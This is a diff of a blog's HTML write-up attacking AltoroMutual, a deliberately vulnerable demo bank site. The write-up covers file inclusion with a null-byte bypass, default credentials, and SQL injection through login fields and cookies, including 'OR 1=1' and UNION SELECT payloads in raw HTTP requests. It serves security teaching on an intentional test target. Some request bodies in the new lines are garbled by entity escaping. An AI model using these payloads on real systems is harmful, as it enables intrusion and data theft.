@@ -1721,81 +1721,77 @@ blog.dornea.nu            </a>
     
 </footer><!-- /.post-info -->                    </div>
                 </div>
-                <div id="toc_container" class="toc_wrap_right toc_transparent no_bullets">
-  <p class="toc_title">
+                <div class="toc_wrap_right toc_transparent no_bullets" id="toc_container">
+<p class="toc_title">
     Contents
   </p>
-
-  <ul class="toc_list">
-    <li>
-      <a href="#Introduction"><span class="toc_number toc_depth_1">1</span> IntroductionÂ </a>
-    </li>
-    <li>
-      <a href="#Vulnerabilities_by_URL"><span class="toc_number toc_depth_1">2</span> Vulnerabilities by URL</a><ul>
-        <li>
-          <a href="#defaultaspxcontent"><span class="toc_number toc_depth_2">2.1</span> /default.aspx?content=</a>
-        </li>
-        <li>
-          <a href="#bank"><span class="toc_number toc_depth_2">2.2</span> /bank</a>
-        </li>
-        <li>
-          <a href="#bankloginaspx"><span class="toc_number toc_depth_2">2.3</span> /bank/login.aspx</a><ul>
-            <li>
-              <a href="#Brute_force_vulnerability"><span class="toc_number toc_depth_3">2.3.1</span> Brute force vulnerability</a>
-            </li>
-            <li>
-              <a href="#SQL_injection_using_POST_parameters"><span class="toc_number toc_depth_3">2.3.2</span> SQL injection using POST parameters</a>
-            </li>
-            <li>
-              <a href="#Base64-encoded_login_credentials"><span class="toc_number toc_depth_3">2.3.3</span> Base64-encoded login credentials</a>
-            </li>
-          </ul>
-        </li>
-
-        <li>
-          <a href="#bankmainaspx"><span class="toc_number toc_depth_2">2.4</span> /bank/main.aspxÂ </a><ul>
-            <li>
-              <a href="#Source_code_disclosure"><span class="toc_number toc_depth_3">2.4.1</span> Source code disclosure</a>
-            </li>
-            <li>
-              <a href="#SQL_injection_using_Cookie_data"><span class="toc_number toc_depth_3">2.4.2</span> SQL injection using Cookie data</a>
-            </li>
-            <li>
-              <a href="#XSS_using_cookie_data"><span class="toc_number toc_depth_3">2.4.3</span> XSS using cookie data</a>
-            </li>
-          </ul>
-        </li>
-      </ul>
-    </li>
-  </ul>
+<ul class="toc_list">
+<li>
+<a href="#Introduction"><span class="toc_number toc_depth_1">1</span> IntroductionÂ </a>
+</li>
+<li>
+<a href="#Vulnerabilities_by_URL"><span class="toc_number toc_depth_1">2</span> Vulnerabilities by URL</a><ul>
+<li>
+<a href="#defaultaspxcontent"><span class="toc_number toc_depth_2">2.1</span> /default.aspx?content=</a>
+</li>
+<li>
+<a href="#bank"><span class="toc_number toc_depth_2">2.2</span> /bank</a>
+</li>
+<li>
+<a href="#bankloginaspx"><span class="toc_number toc_depth_2">2.3</span> /bank/login.aspx</a><ul>
+<li>
+<a href="#Brute_force_vulnerability"><span class="toc_number toc_depth_3">2.3.1</span> Brute force vulnerability</a>
+</li>
+<li>
+<a href="#SQL_injection_using_POST_parameters"><span class="toc_number toc_depth_3">2.3.2</span> SQL injection using POST parameters</a>
+</li>
+<li>
+<a href="#Base64-encoded_login_credentials"><span class="toc_number toc_depth_3">2.3.3</span> Base64-encoded login credentials</a>
+</li>
+</ul>
+</li>
+<li>
+<a href="#bankmainaspx"><span class="toc_number toc_depth_2">2.4</span> /bank/main.aspxÂ </a><ul>
+<li>
+<a href="#Source_code_disclosure"><span class="toc_number toc_depth_3">2.4.1</span> Source code disclosure</a>
+</li>
+<li>
+<a href="#SQL_injection_using_Cookie_data"><span class="toc_number toc_depth_3">2.4.2</span> SQL injection using Cookie data</a>
+</li>
+<li>
+<a href="#XSS_using_cookie_data"><span class="toc_number toc_depth_3">2.4.3</span> XSS using cookie data</a>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
 </div>
-
 <h1 id="Introduction"><span id="Introduction">IntroductionÂ </span></h1>
-<hr />
+<hr/>
 <p>AltoroMutual is an vulnerable-by-design web application created byÂ !WatchFire (nowÂ !AppScan Standard) as a demo test application for theirÂ !BlackBox Scanner. (Source:<a href="https://www.owasp.org/index.php/AltoroMutual">https://www.owasp.org/index.php/AltoroMutual</a>)</p>
 <p>The demo can be found atÂ <a href="http://demo.testfire.net/">http://demo.testfire.net/</a>.</p>
 <p><strong>This is not an usual wargame!</strong>Â I have simply not found an appropriate name for it.<!--more--></p>
-<p>&nbsp;</p>
+<p> </p>
 <h1 id="Vulnerabilities_by_URL"><span id="Vulnerabilities_by_URL">Vulnerabilities by URL</span></h1>
-<hr />
-<p>&nbsp;</p>
+<hr/>
+<p> </p>
 <h2 id="A.2Fdefault.aspx.3Fcontent.3D"><span id="defaultaspxcontent">/default.aspx?content=</span></h2>
-<hr />
-<p>There is aÂ <strong>file inclusion vulnerability</strong>Â which we&#8217;ll use for further investigation. URLÂ <em><a href="http://demo.testfire.net/default.aspx?content=../testing.txt">http://demo.testfire.net/default.aspx?content=../testing.txt</a></em>Â will show:</p>
+<hr/>
+<p>There is aÂ <strong>file inclusion vulnerability</strong>Â which we’ll use for further investigation. URLÂ <em><a href="http://demo.testfire.net/default.aspx?content=../testing.txt">http://demo.testfire.net/default.aspx?content=../testing.txt</a></em>Â will show:</p>
 <pre>An Error Has Occurred
 Summary:
 Could not find file 'D:downloadsAltoroMutual_v6website  esting.txt'.
 Error Message:
 System.IO.FileNotFoundException: Could not find file 'D:downloadsAltoroMutual_v6website esting.txt'. File name: 'D:downloadsAltoroMutual_v6website  esting.txt' at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath) at System.IO.FileStream.Init(String path, FileMode mode, FileAccess access, Int32 rights, Boolean useRights, FileShare share, Int32 bufferSize, FileOptions options, SECURITY_ATTRIBUTES secAttrs, String msgPath, Boolean bFromProxy) at System.IO.FileStream..ctor(String path, FileMode mode, FileAccess access, FileShare share, Int32 bufferSize, FileOptions options) at System.IO.StreamReader..ctor(String path, Encoding encoding, Boolean detectEncodingFromByteOrderMarks, Int32 bufferSize) at System.IO.StreamReader..ctor(String path) at System.IO.File.OpenText(String path) at Altoro.Default.LoadFile(String myFile) in d:downloadsAltoroMutual_v6websitedefault.aspx.cs:line 42 at Altoro.Default.Page_Load(Object sender, EventArgs e) in d:downloadsAltoroMutual_v6websitedefault.aspx.cs:line 70 at System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) at System.Web.Util.CalliEventHandlerDelegateProxy.Callback(Object sender, EventArgs e) at System.Web.UI.Control.OnLoad(EventArgs e) at System.Web.UI.Control.LoadRecursive() at System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
 </pre>
-
 <p>As you can see we have found the root path of the web application which is atÂ <strong>D:downloads!AltoroMutual_v6website</strong>.</p>
-<p><a href="http://static.dornea.nu/img/2013/2760a40b98f8532b3b97df25817f4fd6.png" title="attachment:default.aspx.png"><br />
-<img title="attachment:default.aspx.png" alt="File inclusion vulnerability" src="http://static.dornea.nu/img/2013/2760a40b98f8532b3b97df25817f4fd6.png" width="1007" height="548" /></a></p>
-<p>&nbsp;</p>
+<p><a href="http://static.dornea.nu/img/2013/2760a40b98f8532b3b97df25817f4fd6.png" title="attachment:default.aspx.png"><br/>
+<img alt="File inclusion vulnerability" class="img-responsive" height="548" src="http://static.dornea.nu/img/2013/2760a40b98f8532b3b97df25817f4fd6.png" title="attachment:default.aspx.png" width="1007"/></a></p>
+<p> </p>
 <h2 id="A.2Fbank"><span id="bank">/bank</span></h2>
-<hr />
-<p>You&#8217;ll find aÂ <strong>directory listening</strong>Â atÂ <a href="http://demo.testfire.net/bank/">http://demo.testfire.net/bank/</a>Â which will show you a lot of information about the applications functionalities.</p>
+<hr/>
+<p>You’ll find aÂ <strong>directory listening</strong>Â atÂ <a href="http://demo.testfire.net/bank/">http://demo.testfire.net/bank/</a>Â which will show you a lot of information about the applications functionalities.</p>
 <pre>5/31/2007 11:10 AM        &lt;dir&gt; 20060308_bak
  1/12/2011 10:14 PM         1831 account.aspx
  1/12/2011 10:14 PM         4277 account.aspx.cs
@@ -1822,26 +1818,23 @@ System.IO.FileNotFoundException: Could not find file 'D:downloadsAltoroMutual_v6
  1/12/2011 10:14 PM         3505 transfer.aspx.cs
  1/12/2011 10:14 PM           82 ws.asmx
 </pre>
-
 <p>Since the application is written in C# you might want to see whats behind the *.cs files. However clicking on the files will trigger following error message:</p>
 <pre>An Error Has Occurred
 Summary:
 An unknown error occurred.
 Error Message:
 </pre>
-
-<p><a href="http://static.dornea.nu/img/2013/ad7099c40e16f1a973fbbbfa084100ee.png" title="attachment:cant_access_files.png"><img title="attachment:cant_access_files.png" alt="File inclusion vulnerability" src="http://static.dornea.nu/img/2013/ad7099c40e16f1a973fbbbfa084100ee.png" width="NaN" height="451" /></a></p>
-<p>So you&#8217;ll have to find another way to get to the files. We&#8217;ll use theÂ <strong>file inclusion vulnerability</strong>Â found before to do that.</p>
+<p><a href="http://static.dornea.nu/img/2013/ad7099c40e16f1a973fbbbfa084100ee.png" title="attachment:cant_access_files.png"><img alt="File inclusion vulnerability" class="img-responsive" height="451" src="http://static.dornea.nu/img/2013/ad7099c40e16f1a973fbbbfa084100ee.png" title="attachment:cant_access_files.png" width="NaN"/></a></p>
+<p>So you’ll have to find another way to get to the files. We’ll use theÂ <strong>file inclusion vulnerability</strong>Â found before to do that.</p>
 <p><a href="http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs">http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs</a>Â will result in</p>
 <pre>Error! File must be of type TXT or HTM
 </pre>
-
-<p>We&#8217;ll have to bypass the filter in order to get the file. Remember theÂ <strong>null string vulnerability</strong>? Here we go:Â <a href="http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs%EF%BF%BD.txt">http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs%00.txt</a>.</p>
-<p><a href="http://static.dornea.nu/img/2013/8da145f3e6a8fdbe9cbcee892d28b740.png" title="attachment:null_string.png"><img title="attachment:null_string.png" alt="Null string vulnerability" src="http://static.dornea.nu/img/2013/8da145f3e6a8fdbe9cbcee892d28b740.png" width="NaN" height="578" /></a></p>
+<p>We’ll have to bypass the filter in order to get the file. Remember theÂ <strong>null string vulnerability</strong>? Here we go:Â <a href="http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs%EF%BF%BD.txt">http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs%00.txt</a>.</p>
+<p><a href="http://static.dornea.nu/img/2013/8da145f3e6a8fdbe9cbcee892d28b740.png" title="attachment:null_string.png"><img alt="Null string vulnerability" class="img-responsive" height="578" src="http://static.dornea.nu/img/2013/8da145f3e6a8fdbe9cbcee892d28b740.png" title="attachment:null_string.png" width="NaN"/></a></p>
 <p>That will show you the content ofÂ <em>/bank/login.aspx.cs</em>. Now you can inspect the the source code to find more vulnerabilities.</p>
-<p>&nbsp;</p>
+<p> </p>
 <h2 id="A.2Fbank.2Flogin.aspx"><span id="bankloginaspx">/bank/login.aspx</span></h2>
-<hr />
+<hr/>
 <p>Â Source code disclosure</p>
 <p>Here is the source code (<a href="http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs%EF%BF%BD.txt">http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs%00.txt</a>):</p>
 <pre>using System.Data;
@@ -1995,23 +1988,20 @@ namespace Altoro
   }
 }
 </pre>
-
-<p>&nbsp;</p>
+<p> </p>
 <h3 id="Brute_force_vulnerability"><span id="Brute_force_vulnerability">Brute force vulnerability</span></h3>
-<p>Before we investigate the code, let&#8217;s have a look at a much common vulnerability. Go toÂ <a href="http://demo.testfire.net/bank/login.aspx">http://demo.testfire.net/bank/login.aspx</a>Â and use a random user for the login process. You&#8217;ll get:</p>
+<p>Before we investigate the code, let’s have a look at a much common vulnerability. Go toÂ <a href="http://demo.testfire.net/bank/login.aspx">http://demo.testfire.net/bank/login.aspx</a>Â and use a random user for the login process. You’ll get:</p>
 <pre>Login Failed: We're sorry, but this username was not found in our system. Please try again.
 </pre>
-
-<p><a href="http://static.dornea.nu/img/2013/caddd36fe5dcb272c298070e4b657721.png" title="attachment:login_bad_username.png"><img title="attachment:login_bad_username.png" alt="Username bruteforce vulnerability" src="http://static.dornea.nu/img/2013/caddd36fe5dcb272c298070e4b657721.png" width="NaN" height="581" /></a></p>
-<p>You could now easilyÂ <strong>bruteforce</strong>Â common usernames in order to login into the application. The same works with passwords too:Â <em>admin</em>Â seems to be a valid username. Try to bruteforce the password and you&#8217;ll get:</p>
+<p><a href="http://static.dornea.nu/img/2013/caddd36fe5dcb272c298070e4b657721.png" title="attachment:login_bad_username.png"><img alt="Username bruteforce vulnerability" class="img-responsive" height="581" src="http://static.dornea.nu/img/2013/caddd36fe5dcb272c298070e4b657721.png" title="attachment:login_bad_username.png" width="NaN"/></a></p>
+<p>You could now easilyÂ <strong>bruteforce</strong>Â common usernames in order to login into the application. The same works with passwords too:Â <em>admin</em>Â seems to be a valid username. Try to bruteforce the password and you’ll get:</p>
 <pre>Login Failed: Your password appears to be invalid. Please re-enter your password carefully.
 </pre>
-
-<p><a href="http://static.dornea.nu/img/2013/2f37a76687e6b9d6bf3817152cd4cc59.png" title="attachment:login_bad_password.png"><img title="attachment:login_bad_password.png" alt="Password bruteforce vulnerability" src="http://static.dornea.nu/img/2013/2f37a76687e6b9d6bf3817152cd4cc59.png" width="NaN" height="579" /></a></p>
-<p><em>admin:admin</em>Â is a valid username/password combinationÂ <img title="smiley::-)" alt=":-)" src="http://dornea.nu/moin_static196/mandarin/img/smile.png" width="16" height="16" /></p>
-<p>&nbsp;</p>
+<p><a href="http://static.dornea.nu/img/2013/2f37a76687e6b9d6bf3817152cd4cc59.png" title="attachment:login_bad_password.png"><img alt="Password bruteforce vulnerability" class="img-responsive" height="579" src="http://static.dornea.nu/img/2013/2f37a76687e6b9d6bf3817152cd4cc59.png" title="attachment:login_bad_password.png" width="NaN"/></a></p>
+<p><em>admin:admin</em>Â is a valid username/password combinationÂ <img alt=":-)" class="img-responsive" height="16" src="http://dornea.nu/moin_static196/mandarin/img/smile.png" title="smiley::-)" width="16"/></p>
+<p> </p>
 <h3 id="SQL_injection_using_POST_parameters"><span id="SQL_injection_using_POST_parameters">SQL injection using POST parameters</span></h3>
-<p>Now let&#8217;s have a closer look at the source code&#8230; Let&#8217;s analyze theÂ <em>!ValidateUser</em>Â function:</p>
+<p>Now let’s have a closer look at the source code… Let’s analyze theÂ <em>!ValidateUser</em>Â function:</p>
 <pre>protected string ValidateUser(String uName, String pWord)
     {
       //Set default status to Success
@@ -2029,9 +2019,8 @@ namespace Altoro
       }
       ....
 </pre>
-
-<p>As you can see theÂ <em>uName</em>Â parameter doesn&#8217;t get sanitized, so you can easily run someÂ <strong>SQL injection</strong>. Let&#8217;s try that out. UsingÂ <a href="http://www.portswigger.net/burp/">Burpsuite</a>Â we&#8217;ll tamper data sent to the web server and analyze the responses.</p>
-<p>Here&#8217;s the request:</p>
+<p>As you can see theÂ <em>uName</em>Â parameter doesn’t get sanitized, so you can easily run someÂ <strong>SQL injection</strong>. Let’s try that out. UsingÂ <a href="http://www.portswigger.net/burp/">Burpsuite</a>Â we’ll tamper data sent to the web server and analyze the responses.</p>
+<p>Here’s the request:</p>
 <pre>POST /bank/login.aspx HTTP/1.1
 Host: demo.testfire.net
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.6) Gecko/20100101 Firefox/10.0.6
@@ -2043,19 +2032,17 @@ Referer: http://demo.testfire.net/bank/login.aspx
 Cookie: ASP.NET_SessionId=2ks1fprgokgkd0jthbms3d25; amSessionId=62733112717
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 39
-uid=admin%27&passw=test&btnSubmit=Login
+uid=admin%27&amp;passw;=test&amp;btnSubmit;=Login
 </pre>
-
-<p>As a response you&#8217;ll get:</p>
+<p>As a response you’ll get:</p>
 <pre>An Error Has Occurred
 Summary:
 Syntax error (missing operator) in query expression 'username = 'admin'' AND password = 'test''.
 Error Message:
-System.Data.OleDb.OleDbException: Syntax error (missing operator) in query expression 'username = 'admin'' AND password = 'test''. at System.Data.OleDb.OleDbCommand.ExecuteCommandTextErrorHandling(OleDbHResult hr) at System.Data.OleDb.OleDbCommand.ExecuteCommandTextForSingleResult(tagDBPARAMS dbParams, Object& executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommandText(Object& executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommand(CommandBehavior behavior, Object& executeResult) at System.Data.OleDb.OleDbCommand.ExecuteReaderInternal(CommandBehavior behavior, String method) at System.Data.OleDb.OleDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.OleDb.OleDbCommand.System.Data.IDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, String srcTable) at Altoro.Authentication.ValidateUser(String uName, String pWord) in d:downloadsAltoroMutual_v6websiteanklogin.aspx.cs:line 68 at Altoro.Authentication.Page_Load(Object sender, EventArgs e) in d:downloadsAltoroMutual_v6websiteanklogin.aspx.cs:line 33 at System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) at System.Web.Util.CalliEventHandlerDelegateProxy.Callback(Object sender, EventArgs e) at System.Web.UI.Control.OnLoad(EventArgs e) at System.Web.UI.Control.LoadRecursive() at System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+System.Data.OleDb.OleDbException: Syntax error (missing operator) in query expression 'username = 'admin'' AND password = 'test''. at System.Data.OleDb.OleDbCommand.ExecuteCommandTextErrorHandling(OleDbHResult hr) at System.Data.OleDb.OleDbCommand.ExecuteCommandTextForSingleResult(tagDBPARAMS dbParams, Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommandText(Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommand(CommandBehavior behavior, Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteReaderInternal(CommandBehavior behavior, String method) at System.Data.OleDb.OleDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.OleDb.OleDbCommand.System.Data.IDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, String srcTable) at Altoro.Authentication.ValidateUser(String uName, String pWord) in d:downloadsAltoroMutual_v6websiteanklogin.aspx.cs:line 68 at Altoro.Authentication.Page_Load(Object sender, EventArgs e) in d:downloadsAltoroMutual_v6websiteanklogin.aspx.cs:line 33 at System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) at System.Web.Util.CalliEventHandlerDelegateProxy.Callback(Object sender, EventArgs e) at System.Web.UI.Control.OnLoad(EventArgs e) at System.Web.UI.Control.LoadRecursive() at System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
 </pre>
-
 <p><a href="http://dornea.nu/wargames/altoro-mutual?action=AttachFile&amp;do=get&amp;target=login_sql_injection.png" title="attachment:login_sql_injection.png">lkashd oada</a></p>
-<p><em>Single quotes</em>Â are obvisouly not escaped so we could inject some SQL statements. Let&#8217;s try some common ones likeÂ <strong>admin&#8217; OR 1=1;&#8211;</strong>:Â </p>
+<p><em>Single quotes</em>Â are obvisouly not escaped so we could inject some SQL statements. Let’s try some common ones likeÂ <strong>admin’ OR 1=1;–</strong>:Â </p>
 <pre>POST /bank/login.aspx HTTP/1.1
 Host: demo.testfire.net
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.6) Gecko/20100101 Firefox/10.0.6
@@ -2067,9 +2054,8 @@ Referer: http://demo.testfire.net/bank/login.aspx
 Cookie: ASP.NET_SessionId=2ks1fprgokgkd0jthbms3d25; amSessionId=62733112717
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 47
-uid=admin' OR 1=1;--&passw=test&btnSubmit=Login
+uid=admin' OR 1=1;--&amp;passw;=test&amp;btnSubmit;=Login
 </pre>
-
 <p>The result looks very promising! We were able to login without specifying any password. All you need is a valid username. The same vulnerability applies to theÂ <em>password</em>Â field as well. Following request will work too:</p>
 <pre>#!highlight c# 
 POST /bank/login.aspx HTTP/1.1
@@ -2080,27 +2066,24 @@ Accept-Language: en-us,en;q=0.5
 Accept-Encoding: gzip, deflate
 Proxy-Connection: keep-alive
 Referer: http://demo.testfire.net/bank/login.aspx
-Cookie: ASP.NET_SessionId=2ks1fprgokgkd0jthbms3d25; amSessionId=62733112717; amUserInfo=UserName=YWRtaW4nIE9SIDE9MjstLQ==&Password=dGVzdA==
+Cookie: ASP.NET_SessionId=2ks1fprgokgkd0jthbms3d25; amSessionId=62733112717; amUserInfo=UserName=YWRtaW4nIE9SIDE9MjstLQ==&amp;Password;=dGVzdA==
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 50
-uid=admin&passw=' OR 1=1;--&btnSubmit=Login</pre>
-
+uid=admin&amp;passw;=' OR 1=1;--&amp;btnSubmit;=Login</pre>
 <h3 id="Base64-encoded_login_credentials"><span id="Base64-encoded_login_credentials">Base64-encoded login credentials</span></h3>
 <p>After a successful login the server will set a cookieÂ <em>amUserInfo</em>Â which contains login information encoded in base64. This is for sure a vulnerability since an attacker could easily decode the information and get the login credentials.</p>
-<pre>amUserInfo=UserName=YWRtaW4nIE9SIDE9MjstLQ==&Password=dGVzdA==
+<pre>amUserInfo=UserName=YWRtaW4nIE9SIDE9MjstLQ==&amp;Password;=dGVzdA==
 </pre>
-
-<p>decodes to&#8230;</p>
-<pre>amUserInfo=Username=admin' OR 1=2;--&Password=test
+<p>decodes to…</p>
+<pre>amUserInfo=Username=admin' OR 1=2;--&amp;Password;=test
 </pre>
-
-<p>&nbsp;</p>
+<p> </p>
 <h2 id="A.2Fbank.2Fmain.aspx"><span id="bankmainaspx">/bank/main.aspxÂ </span></h2>
-<hr />
-<p>After a successful login you&#8217;ll be redirected toÂ <a href="http://demo.testfire.net/bank/main.aspx">http://demo.testfire.net/bank/main.aspx</a>. Let&#8217;s have a look at the functionalities within this page.</p>
-<p>&nbsp;</p>
+<hr/>
+<p>After a successful login you’ll be redirected toÂ <a href="http://demo.testfire.net/bank/main.aspx">http://demo.testfire.net/bank/main.aspx</a>. Let’s have a look at the functionalities within this page.</p>
+<p> </p>
 <h3 id="Source_code_disclosure-1"><span id="Source_code_disclosure">Source code disclosure</span></h3>
-<p>Here&#8217;s the source code (<a href="http://demo.testfire.net/default.aspx?content=../bank/main.aspx.cs%EF%BF%BD.txt">http://demo.testfire.net/default.aspx?content=../bank/main.aspx.cs%00.txt</a>)</p>
+<p>Here’s the source code (<a href="http://demo.testfire.net/default.aspx?content=../bank/main.aspx.cs%EF%BF%BD.txt">http://demo.testfire.net/default.aspx?content=../bank/main.aspx.cs%00.txt</a>)</p>
 <pre>using System.Collections;
 using System.ComponentModel;
 using System.Data;
@@ -2204,8 +2187,7 @@ namespace Altoro
     }
 }
 </pre>
-
-<p>&nbsp;</p>
+<p> </p>
 <h3 id="SQL_injection_using_Cookie_data"><span id="SQL_injection_using_Cookie_data">SQL injection using Cookie data</span></h3>
 <p>After login following request will be sent to the server:</p>
 <pre>GET /bank/main.aspx HTTP/1.1
@@ -2216,43 +2198,38 @@ Accept-Language: en-us,en;q=0.5
 Accept-Encoding: gzip, deflate
 Proxy-Connection: keep-alive
 Referer: http://demo.testfire.net/bank/login.aspx
-Cookie: ASP.NET_SessionId=2ks1fprgokgkd0jthbms3d25; amSessionId=62733112717; amUserInfo=UserName=YWRtaW4=&Password=YWRtaW4=; amUserId=1
+Cookie: ASP.NET_SessionId=2ks1fprgokgkd0jthbms3d25; amSessionId=62733112717; amUserInfo=UserName=YWRtaW4=&amp;Password;=YWRtaW4=; amUserId=1
 </pre>
-
-<p>A look at theÂ <em>GetAccounts</em>Â in the source code reveals thatÂ <em>userId</em>Â is actually some data from the cookieÂ <em>amUserId</em>Â and never gets sanitized. Let&#8217;s have some fun:</p>
+<p>A look at theÂ <em>GetAccounts</em>Â in the source code reveals thatÂ <em>userId</em>Â is actually some data from the cookieÂ <em>amUserId</em>Â and never gets sanitized. Let’s have some fun:</p>
 <pre>#!highlight html 
 GET /bank/main.aspx HTTP/1.1
 ...
-amUserInfo=UserName=YWRtaW4=&Password=YWRtaW4=; amUserId=1'
+amUserInfo=UserName=YWRtaW4=&amp;Password;=YWRtaW4=; amUserId=1'
 </pre>
-
 <p><em>amUserId</em>Â was changed and the whole GET request was sent again to the server. The response was quite informative:Â </p>
 <pre>#!highlight asp-cx 
 An Error Has Occurred
 Summary:
 Syntax error in string in query expression 'userid = 1''.
 Error Message:
-System.Data.OleDb.OleDbException: Syntax error in string in query expression 'userid = 1''. at System.Data.OleDb.OleDbCommand.ExecuteCommandTextErrorHandling(OleDbHResult hr) at System.Data.OleDb.OleDbCommand.ExecuteCommandTextForSingleResult(tagDBPARAMS dbParams, Object& executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommandText(Object& executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommand(CommandBehavior behavior, Object& executeResult) at System.Data.OleDb.OleDbCommand.ExecuteReaderInternal(CommandBehavior behavior, String method) at System.Data.OleDb.OleDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.OleDb.OleDbCommand.System.Data.IDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, String srcTable) at Altoro.Default.GetAccounts(String userId) in d:downloadsAltoroMutual_v6websiteankmain.aspx.cs:line 54 at Altoro.Default.Page_Load(Object sender, EventArgs e) in d:downloadsAltoroMutual_v6websiteankmain.aspx.cs:line 31 at System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) at System.Web.Util.CalliEventHandlerDelegateProxy.Callback(Object sender, EventArgs e) at System.Web.UI.Control.OnLoad(EventArgs e) at System.Web.UI.Control.LoadRecursive() at System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+System.Data.OleDb.OleDbException: Syntax error in string in query expression 'userid = 1''. at System.Data.OleDb.OleDbCommand.ExecuteCommandTextErrorHandling(OleDbHResult hr) at System.Data.OleDb.OleDbCommand.ExecuteCommandTextForSingleResult(tagDBPARAMS dbParams, Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommandText(Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommand(CommandBehavior behavior, Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteReaderInternal(CommandBehavior behavior, String method) at System.Data.OleDb.OleDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.OleDb.OleDbCommand.System.Data.IDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, String srcTable) at Altoro.Default.GetAccounts(String userId) in d:downloadsAltoroMutual_v6websiteankmain.aspx.cs:line 54 at Altoro.Default.Page_Load(Object sender, EventArgs e) in d:downloadsAltoroMutual_v6websiteankmain.aspx.cs:line 31 at System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) at System.Web.Util.CalliEventHandlerDelegateProxy.Callback(Object sender, EventArgs e) at System.Web.UI.Control.OnLoad(EventArgs e) at System.Web.UI.Control.LoadRecursive() at System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
 </pre>
-
-<p><a href="http://static.dornea.nu/img/2013/b1026f72d91a1a47e093af15e154b71d.png" title="attachment:main_sql_injection.png"><img title="attachment:main_sql_injection.png" alt="SQL Injection" src="http://static.dornea.nu/img/2013/b1026f72d91a1a47e093af15e154b71d.png" width="NaN" height="580" /></a></p>
+<p><a href="http://static.dornea.nu/img/2013/b1026f72d91a1a47e093af15e154b71d.png" title="attachment:main_sql_injection.png"><img alt="SQL Injection" class="img-responsive" height="580" src="http://static.dornea.nu/img/2013/b1026f72d91a1a47e093af15e154b71d.png" title="attachment:main_sql_injection.png" width="NaN"/></a></p>
 <p>Ahhh, there we go!Â <strong>Another SQL injection vulnerability!</strong>Â You could now dump some data:</p>
-<p>&nbsp;</p>
+<p> </p>
 <pre>#!highlight html 
 GET /bank/main.aspx HTTP/1.1
 Host: demo.testfire.net
 ...
-amUserInfo=UserName=YWRtaW4=&Password=YWRtaW4=; amUserId=2 union select accountid, acct_type from accounts;--
